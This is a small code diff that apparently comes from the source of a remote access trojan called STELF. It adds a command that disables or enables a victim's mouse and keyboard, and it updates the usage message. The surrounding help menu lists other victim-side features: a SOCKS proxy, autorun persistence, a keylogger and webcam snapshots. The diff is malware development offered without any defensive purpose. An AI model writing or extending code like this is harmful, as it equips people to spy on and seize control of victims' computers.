@@ -813,6 +813,7 @@ proxy start - Start SOCKSv4 proxy on victim.
 persist - Add STELF to autorun.
 keylog|keyscan [start|stop|dump] - Start or stop the keylogger, or print logged keys.
 webcam [list|snap] [id] - Take a picture from the webcam
+uictl [disable|enable] [mouse|keyboard] - Lock or unlock mouse and keyboard.
 help - This menu!
 '''
 			elif data.startswith("cd"):
@@ -897,7 +898,7 @@ help - This menu!
 				try:
 					action, what = data.split()[1], data.split()[2]
 				except:
-					output = "why"
+					output = "[*]Usage: uictl [disable|enable] [mouse|keyboard]"
 				else:
 					output = info.uictl(action, what)
 					
